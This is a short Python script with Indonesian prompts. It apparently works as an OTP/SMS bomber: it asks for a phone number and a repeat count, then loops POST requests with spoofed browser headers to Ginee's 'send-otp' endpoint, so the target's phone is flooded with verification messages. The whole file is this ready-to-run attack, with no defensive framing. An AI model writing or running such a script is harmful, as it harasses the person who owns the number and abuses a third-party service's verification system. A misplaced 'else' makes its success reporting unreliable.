import requests,json

no = input("Nomer : ")
jum = int(input("jumlah : "))
for i in range(jum):
 head = {
 'Host': 'bizapi.ginee.com',
 'content-length': '1620',
 'sec-ch-ua': '"Chromium";v="114", "Google Chrome";v="114", ":Not.A/Brand";v="8"',
 'accept-language': 'id',
 'sec-ch-ua-mobile': '?0',
 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
 'content-type': 'application/json',
 'accept': 'application/json, text/plain, */*',
 'sec-ch-ua-platform': '"Android"',
 '0rigin' : 'https://accounts.ginee.com',
 'sec-fetch-site': 'same-site',
 'sec-fetch-mode': 'cors',
 'sec-fetch-dest': 'empty',
 'referer': 'https://accounts.ginee.com/'}
 data =json.dumps({"identity":"0"+no})
 pos = requests.post("https://bizapi.ginee.com/infra/common/security/send-otp",data=data,headers=head).text
 print(pos)
 if "SUCCESS" in pos:
   print("Berhasil")
else:
   print("Gagal")
